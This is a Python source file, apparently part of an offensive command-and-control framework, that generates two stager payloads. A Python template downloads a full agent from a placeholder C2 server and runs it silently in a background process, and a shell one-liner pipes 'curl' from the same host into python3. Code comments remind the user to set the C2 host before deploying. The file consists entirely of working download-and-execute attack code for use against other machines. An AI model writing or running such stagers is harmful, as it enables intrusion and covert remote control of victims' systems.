"""stager — generate stager payload (downloads full agent from C2)"""
from pathlib import Path

TEMPLATE_PY = '''
# omni_stager.py — downloads + runs full agent from C2, then deletes itself
import urllib.request, os, subprocess, tempfile, sys

C2 = "http://YOUR-C2:8000/agent.py"

def stage():
    try:
        data = urllib.request.urlopen(C2, timeout=10).read()
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".py", mode="wb")
        tmp.write(data); tmp.close()
        subprocess.Popen([sys.executable, tmp.name])
        os.unlink(tmp.name) if False else None  # keep for inspection
    except Exception as e:
        pass

if __name__ == "__main__":
    stage()
'''

TEMPLATE_SH = '''#!/bin/sh
# omni_stager.sh — one-liner shell stager
curl -s http://YOUR-C2:8000/agent.py | python3 &
exit 0
'''

class Stager:
    def run(self, session, logger):
        out = Path("payloads") / "c2"
        out.mkdir(parents=True, exist_ok=True)
        py = out / "omni_stager.py"; py.write_text(TEMPLATE_PY)
        sh = out / "omni_stager.sh"; sh.write_text(TEMPLATE_SH)
        print(f"[c2:stager] written: {py}, {sh}")
        print(f"  edit C2 host before deploy")
        logger.info("c2_stager", py=str(py), sh=str(sh))
        return {"python": str(py), "shell": str(sh)}
